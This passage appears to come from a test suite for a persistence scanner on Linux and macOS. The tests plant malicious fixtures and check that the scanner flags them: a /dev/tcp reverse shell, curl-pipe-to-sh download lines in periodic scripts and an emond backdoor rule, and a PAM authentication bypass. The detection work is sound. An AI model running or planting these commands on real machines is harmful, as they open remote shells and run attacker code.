    put(unix_tree, "/usr/lib/cron/jobs/a0000501a1b2c3", AT_SCRIPT, 0o600)  # macOS
    entries = ps.collect_at_jobs(unix_tree)
    rows = by_name(entries)
    assert set(rows) == {"a0000101a1b2c3", "a0000201a1b2c3", "a0000301a1b2c3", "a0000401a1b2c3", "a0000501a1b2c3"}
    assert all(e["type"] == "at_job" and e["enabled"] and e["command"].startswith("sha1:") for e in entries)
    assert [verdict(e) for n, e in rows.items() if n != "a0000201a1b2c3"] == [S.INFO] * 4
    assert verdict(rows["a0000201a1b2c3"]) >= S.MEDIUM
    f = finding(rows["a0000201a1b2c3"])
    assert f.rule_id == "AEG-PERS-ATJOB" and "T1053.002" in f.mitre
    assert f.location == f"{unix_tree.root / 'var' / 'spool' / 'cron' / 'atjobs'} [a0000201a1b2c3]"


def test_at_jobs_spool_reachable_through_two_names_is_read_once(unix_tree):
    put(unix_tree, "/var/spool/atjobs/a0000101a1b2c3", AT_SCRIPT, 0o700)
    (unix_tree.root / "var" / "spool" / "cron").mkdir(parents=True)
    (unix_tree.root / "var" / "spool" / "cron" / "atjobs").symlink_to("../atjobs")
    assert len(ps.collect_at_jobs(unix_tree)) == 1
    assert ps.collect_at_jobs(ps.LinuxPaths(etc=unix_tree.etc / "nope", homes=unix_tree.homes)) == []


# --------------------------------------------------------------------------- macOS: periodic scripts

def test_periodic_scripts_stock_ones_are_not_flagged(unix_tree):
    for period in ("daily", "weekly", "monthly"):
        put(unix_tree, f"/etc/periodic/{period}/999.local", PERIODIC_STOCK["999.local"])
    put(unix_tree, "/etc/periodic/daily/110.clean-tmps", PERIODIC_STOCK["110.clean-tmps"])
    put(unix_tree, "/etc/periodic/daily/130.clean-msgs", PERIODIC_STOCK["130.clean-msgs"])
    entries = ps.collect_periodic(unix_tree)
    assert len(entries) == 5 and {e["type"] for e in entries} == {"periodic"}
    assert all(verdict(e) == S.INFO and e["enabled"] for e in entries)
    assert {e["location"] for e in entries} == {str(unix_tree.etc / "periodic" / p) for p in ("daily", "weekly", "monthly")}


def test_periodic_scripts_added_by_an_attacker_are_flagged(unix_tree):
    put(unix_tree, "/etc/periodic/daily/110.clean-tmps", PERIODIC_STOCK["110.clean-tmps"])
    put(unix_tree, "/etc/periodic/daily/500.evil", CURL_SH)
    put(unix_tree, "/usr/local/etc/periodic/weekly/900.mine", "#!/bin/sh\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n")
    put(unix_tree, "/etc/periodic/monthly/off", CURL_SH, 0o644)
    put(unix_tree, "/etc/daily.local", "curl -s http://evil.example.com/p | sh\n", 0o644)  # run by 999.local through sh
    entries = ps.collect_periodic(unix_tree)
    rows = by_name(entries)
    assert set(rows) == {"110.clean-tmps", "500.evil", "900.mine", "off", "daily.local"}
    assert verdict(rows["110.clean-tmps"]) == S.INFO and verdict(rows["500.evil"]) >= S.MEDIUM
    assert verdict(rows["900.mine"]) == S.CRITICAL and verdict(rows["daily.local"]) >= S.MEDIUM
    assert rows["off"]["enabled"] is False and rows["daily.local"]["enabled"] is True
    f = finding(rows["500.evil"])
    assert f.rule_id == "AEG-PERS-PERIODIC" and "T1053.003" in f.mitre


# --------------------------------------------------------------------------- macOS: emond

def emond_plist(*rules):
    return plistlib.dumps(list(rules))


def test_emond_rules_and_clients(unix_tree):
    backdoor = {"name": "backdoor", "enabled": True, "eventTypes": ["startup"], "actions": [
        {"command": "/bin/sh", "arguments": ["-c", "curl -s http://1.2.3.4/a | sh"], "type": "RunCommand", "user": "root"},
        {"command": "/usr/bin/touch", "arguments": ["/tmp/x"], "type": "RunCommand"}]}
    sample = {"name": "sample", "enabled": False, "eventTypes": ["periodic"], "actions": [
        {"command": "/usr/bin/say", "arguments": ["hi"], "type": "RunCommand"}, {"type": "Log", "message": "x"}]}
    put(unix_tree, "/etc/emond.d/rules/SampleRules.plist", "", 0o644).write_bytes(emond_plist(backdoor, sample))
    put(unix_tree, "/etc/emond.d/rules/broken.plist", "not a plist", 0o644)
    put(unix_tree, "/private/var/db/emondClients/trigger", "", 0o644)
    put(unix_tree, "/private/var/db/emondClients/.DS_Store", "", 0o644)
    entries = ps.collect_emond(unix_tree)
    rows = by_name(entries)
    assert set(rows) == {"backdoor", "backdoor #2", "sample", "trigger"} and {e["type"] for e in entries} == {"emond"}
    assert rows["backdoor"]["command"] == '/bin/sh -c "curl -s http://1.2.3.4/a | sh"' and rows["backdoor"]["path"] == "/bin/sh"
    assert verdict(rows["backdoor"]) == S.HIGH  # MEDIUM for the rule, HIGH for the command it runs
    assert verdict(rows["backdoor #2"]) == S.MEDIUM and rows["backdoor #2"]["command"] == "/usr/bin/touch /tmp/x"
    assert rows["sample"]["enabled"] is False and ps.assess_entry(rows["sample"]) == []
    assert verdict(rows["trigger"]) == S.LOW and rows["trigger"]["location"].endswith("emondClients")
    f = finding(rows["backdoor #2"])
    assert f.rule_id == "AEG-PERS-EMOND" and f.severity == S.MEDIUM and "T1546.014" in f.mitre
    assert len({finding(e).fingerprint for e in entries if e["enabled"]}) == 3


def test_modern_macos_without_emond_rules_has_no_entries(unix_tree):
    assert ps.collect_emond(unix_tree) == []
    (unix_tree.root / "etc" / "emond.d" / "rules").mkdir(parents=True)
    (unix_tree.root / "private" / "var" / "db" / "emondClients").mkdir(parents=True)
    assert ps.collect_emond(unix_tree) == []
    assert ps.parse_emond_rules(plistlib.dumps({"not": "a list"})) == []


# --------------------------------------------------------------------------- macOS: authorization plugins

def test_authorization_plugins_are_inventoried(unix_tree):
    base = "/Library/Security/SecurityAgentPlugins"
    info = plistlib.dumps({"CFBundleExecutable": "JamfConnectLogin"})
    put(unix_tree, f"{base}/JamfConnectLogin.bundle/Contents/MacOS/JamfConnectLogin", "\xcf\xfa", 0o755)
    put(unix_tree, f"{base}/JamfConnectLogin.bundle/Contents/Info.plist", "", 0o644).write_bytes(info)
    put(unix_tree, f"{base}/NoMADLoginAD.bundle/Contents/MacOS/NoMADLoginAD", "\xcf\xfa", 0o755)  # no Info.plist
    (unix_tree.root / "Library" / "Security" / "SecurityAgentPlugins" / "Empty.bundle").mkdir()
    put(unix_tree, f"{base}/readme.txt", "x", 0o644)
    entries = ps.collect_auth_plugins(unix_tree)
    rows = by_name(entries)
    assert set(rows) == {"JamfConnectLogin.bundle", "NoMADLoginAD.bundle", "Empty.bundle"}
    assert {e["type"] for e in entries} == {"auth_plugin"}
    d = unix_tree.root / "Library" / "Security" / "SecurityAgentPlugins"
    jamf = d / "JamfConnectLogin.bundle" / "Contents" / "MacOS" / "JamfConnectLogin"
    assert rows["JamfConnectLogin.bundle"]["path"] == str(jamf)
    assert rows["NoMADLoginAD.bundle"]["command"].endswith("NoMADLoginAD.bundle/Contents/MacOS/NoMADLoginAD")
    assert rows["Empty.bundle"]["path"] == str(d / "Empty.bundle")
    root = unix_tree.root
    assert all(verdict(e, root=root) == S.INFO for e in entries)  # known vendors are not suspicious by themselves
    # the usual path heuristics still apply
    assert verdict(dict(rows["Empty.bundle"], path="/tmp/.x/Evil.bundle/Contents/MacOS/Evil")) >= S.MEDIUM
    f = ps.finding_for_entry(rows["JamfConnectLogin.bundle"], [ps.Reason(S.LOW, "x: y", "meta")])
    assert f.rule_id == "AEG-PERS-AUTHPLUGIN" and f.mitre[0] == "T1556"


def test_no_authorization_plugin_directory(unix_tree):
    assert ps.collect_auth_plugins(unix_tree) == []


# --------------------------------------------------------------------------- macOS: login and logout hooks

def test_login_and_logout_hooks(unix_tree):
    put(unix_tree, "/Library/Preferences/com.apple.loginwindow.plist", "", 0o644).write_bytes(
        plistlib.dumps({"LoginHook": "/Library/Scripts/login.sh", "LogoutHook": "/Library/Scripts/logout.sh",
                        "autoLoginUser": "bob"}))
    user = unix_tree.homes[0] / "Library" / "Preferences"
    user.mkdir(parents=True)
    (user / "com.apple.loginwindow.plist").write_bytes(plistlib.dumps({"LoginHook": "/tmp/.x/hook.sh"}, fmt=plistlib.FMT_BINARY))
    (unix_tree.homes[0] / "Library" / "Preferences" / "other.plist").write_bytes(plistlib.dumps({"LoginHook": "/x"}))
    entries = ps.collect_login_hooks(unix_tree)
    assert len(entries) == 3 and {e["type"] for e in entries} == {"login_hook"}
    assert sorted((e["name"], e["command"], "/home/bob/" in e["location"]) for e in entries) == [
        ("LoginHook", "/Library/Scripts/login.sh", False), ("LoginHook", "/tmp/.x/hook.sh", True),
        ("LogoutHook", "/Library/Scripts/logout.sh", False)]
    by_cmd = {e["command"]: e for e in entries}
    assert verdict(by_cmd["/Library/Scripts/login.sh"]) == S.LOW and verdict(by_cmd["/Library/Scripts/logout.sh"]) == S.LOW
    assert verdict(by_cmd["/tmp/.x/hook.sh"]) >= S.MEDIUM  # a hook that also lives in /tmp
    assert verdict(by_cmd["/Library/Scripts/login.sh"], exists=lambda _p: False) == S.LOW
    f = finding(by_cmd["/Library/Scripts/login.sh"])
    assert f.rule_id == "AEG-PERS-LOGINHOOK" and "T1037.002" in f.mitre and "login" in f.description
    assert "logout" in finding(by_cmd["/Library/Scripts/logout.sh"]).description


def test_no_login_hooks_without_the_keys(unix_tree):
    assert ps.collect_login_hooks(unix_tree) == []
    put(unix_tree, "/Library/Preferences/com.apple.loginwindow.plist", "", 0o644).write_bytes(
        plistlib.dumps({"LoginHook": "  ", "LogoutHook": 5, "SHOWFULLNAME": True}))
    (unix_tree.homes[0] / "Library" / "Preferences").mkdir(parents=True)
    (unix_tree.homes[0] / "Library" / "Preferences" / "com.apple.loginwindow.plist").write_text("garbage")
    assert ps.collect_login_hooks(unix_tree) == []


# --------------------------------------------------------------------------- wiring

def populate_everything(lp):
    put_pam(lp, {"sshd": "auth sufficient pam_permit.so\nsession optional pam_exec.so /tmp/.x/h.sh\n"})
    put(lp, "/etc/update-motd.d/90-evil", CURL_SH)
    put(lp, "/etc/systemd/system-generators/g", "#!/bin/sh\n")
    put(lp, "/var/spool/cron/atjobs/a0000101a1b2c3", CURL_SH, 0o700)
    put(lp, "/etc/periodic/daily/500.evil", CURL_SH)
    rule = {"name": "r", "enabled": True, "eventTypes": ["startup"], "actions": [{"command": "/bin/x", "type": "RunCommand"}]}
    put(lp, "/etc/emond.d/rules/r.plist", "", 0o644).write_bytes(emond_plist(rule))
    put(lp, "/Library/Security/SecurityAgentPlugins/P.bundle/Contents/MacOS/P", "x")
    hooks = plistlib.dumps({"LoginHook": "/Library/h.sh"})
    put(lp, "/Library/Preferences/com.apple.loginwindow.plist", "", 0o644).write_bytes(hooks)


def test_collect_all_includes_the_new_collectors(unix_tree, monkeypatch):
    populate_everything(unix_tree)
    monkeypatch.setattr(ps, "IS_WINDOWS", False)
    monkeypatch.setattr(ps, "IS_MAC", False)
    errors = []
    linux = ps.collect_all(errors, linux_paths=unix_tree)
    assert errors == [] and {"pam", "motd", "systemd_generator", "at_job"} <= {e["type"] for e in linux}
    assert not {"periodic", "emond", "auth_plugin", "login_hook"} & {e["type"] for e in linux}
    monkeypatch.setattr(ps, "IS_MAC", True)
    monkeypatch.setattr(ps, "collect_launchd", lambda dirs=None: [])
    mac = ps.collect_all(errors, linux_paths=unix_tree)
    assert errors == [] and {"periodic", "emond", "auth_plugin", "login_hook"} <= {e["type"] for e in mac}
    assert {e["type"] for e in mac} <= set(ps.TYPE_INFO)
    for e in mac:
        assert {"type", "location", "name", "command", "path", "enabled"} <= set(e)


def test_scanner_reports_the_new_entry_types(monkeypatch, unix_tree, ctx):
    populate_everything(unix_tree)
    monkeypatch.setattr(ps, "IS_MAC", True)
    monkeypatch.setattr(ps, "collect_launchd", lambda dirs=None: [])
    monkeypatch.setattr(ps, "LinuxPaths", lambda: unix_tree)
    out = list(ps.PersistenceScanner().run(ctx))
    findings = [o for o in out if isinstance(o, Finding)]
    checks = [o for o in out if isinstance(o, CheckResult)]
    rules = {f.rule_id for f in findings}
    assert {"AEG-PERS-PAM", "AEG-PERS-MOTD", "AEG-PERS-GENERATOR", "AEG-PERS-ATJOB", "AEG-PERS-PERIODIC", "AEG-PERS-EMOND",
            "AEG-PERS-LOGINHOOK"} <= rules
    assert all(f.scanner == "persistence" for f in findings if f.rule_id.startswith("AEG-PERS"))
    assert checks[-1].check_id == "AEG-PERS-CHK-AUTOSTART" and checks[-1].status == "fail"
    pam = [f for f in findings if f.rule_id == "AEG-PERS-PAM"]
    assert {f.severity for f in pam} == {S.HIGH} and len({f.fingerprint for f in pam}) == 2
    assert all(f.mitre[0] == "T1556.003" for f in pam)


def test_every_collector_entry_type_is_known(unix_tree):
    populate_everything(unix_tree)
    put(unix_tree, "/lib/security/pam_stray.so", "x", 0o644)
    entries = []
    for fn in (ps.collect_pam, ps.collect_motd, ps.collect_generators, ps.collect_at_jobs, ps.collect_periodic, ps.collect_emond,
               ps.collect_auth_plugins, ps.collect_login_hooks):
        entries += fn(unix_tree) if fn is not ps.collect_pam else fn(unix_tree, owned=lambda files: set())
    assert {e["type"] for e in entries} == set(NEW_TYPES)
    for e in entries:
        assert ps.TYPE_INFO[e["type"]][0] == NEW_TYPES[e["type"]][0]
        if e["type"] in ps.TEXT_TYPES:
            assert e["meta"]["text"] and e["command"].startswith("sha1:")


# --------------------------------------------------------------------------- this machine

@pytest.mark.skipif(not sys.platform.startswith("linux"), reason="reads the real /etc of a Linux system")
def test_new_collectors_on_this_linux_machine_are_quiet():
    lp = ps.LinuxPaths()
    entries = ps.collect_pam(lp) + ps.collect_motd(lp) + ps.collect_generators(lp) + ps.collect_at_jobs(lp)
    for e in entries:
        assert {"type", "location", "name", "command", "path", "enabled"} <= set(e) and e["type"] in NEW_TYPES
    loud = [(e["type"], e["location"], e["name"], verdict(e, ps.target_exists).name) for e in entries
            if verdict(e, ps.target_exists) > S.LOW]
    assert not loud, f"a default distribution file was flagged above LOW: {loud}"
    # whatever the stock files are, replaying every login stack of this machine must not raise
    files = [f for f in (lp.etc / "pam.d").glob("*") if f.is_file()]
    services = {f.name: ps.parse_pam_conf(f.read_text(errors="replace"), f.name) for f in files}
    assert ps.pam_bypass_rules(services) == {}
